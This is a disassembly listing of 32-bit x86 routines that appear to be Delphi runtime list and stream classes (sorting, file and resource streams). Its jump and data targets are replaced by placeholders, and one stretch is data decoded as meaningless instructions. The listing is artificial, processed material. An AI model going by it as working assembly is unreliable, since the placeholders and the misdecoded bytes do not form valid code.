lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_402988
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404b0c
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41b938
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ada0
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_41ada0
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41b994
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41b994
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41b9b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_41ba30
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ada0
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403fc0
pop edi
pop esi
pop ebx
retn
sub_41ba6c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ada0
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41ba94
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41bac8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_41b068
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41bb14
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41ada0
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ada0
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41bb68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41ba94
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403fc0
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_402988
sub_41bbe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41ada0
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ada0
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403fc0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41bc3c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ada0
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41bc7c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41b994
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41bc7c
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41bd2c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41bd88
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41bc7c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41bddc
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41be10
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41be74
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41bec8
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_40316c
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
mov esp ebp
pop ebp
retn
sub_41bf14
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_403164
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41bec8
pop ecx
mov eax [ ebx ]
call sub_4031a8
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41bec8
pop ecx
sub_41bf98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41c008
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
sub_41c040
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
sub_41c078
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41bdfc
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_40278c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41c154
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c15b
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4027ac
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41c008
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41c040
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41c16c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c7f0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c1bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41e824
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c1c3
mov eax [ ebp - 0x8 ]
call sub_40321c
retn
sub_41c1cc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031ec
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_41c228
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_4086a0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41c268
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40ceec
pop ebx
pop ebp
retn 0x8
sub_41c290
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41c2d4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_41c2d4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41c3fd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_403540
movzx edx di
mov eax esi
call sub_4085c4
mov ecx eax
xor edx edx
mov eax ebx
call sub_41c1cc
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_408640
mov ecx eax
xor edx edx
mov eax ebx
call sub_41c1cc
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c404
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403f90
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4087e0
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40b0b0
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4087e0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40b0b0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
jmp r-xdata
sub_41c404
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_41c428
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
call sub_4086d8
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41c464
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_402988
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41c49c
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41c4c0
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_41c4ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41c504
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41bdfc
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41c008
sub_41c53c
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41c45c
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41c564
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41c53c
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41c590
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406cb4
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406c98
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406c88
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
test ecx ecx
jne r-xdata
sub_41c61c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_402988
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41c53c
sub_41c66c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031ec
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_40442c
mov ecx eax
mov edx esi
mov eax edi
call sub_41c734
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_41c6c4
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41c727
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c72e
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_41c734
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41c6c4
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41c45c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41c6c4
pop ecx
sub_41c7a0
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406c84
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41c7f0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_40278c
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_41c838
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4027ac
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41c868
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xc8
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh cl
enter 0x41 0x18
add [ eax ] al
add [ eax ] cl
adc [ eax ] eax
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add ah bl
leave
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
int3
sub_41c93c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403fc0
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403fc0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_41c994
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_40405c
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4044cc
mov al 0x1
inc ebx
sub_41c9ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ca63
push [ fs : eax ]
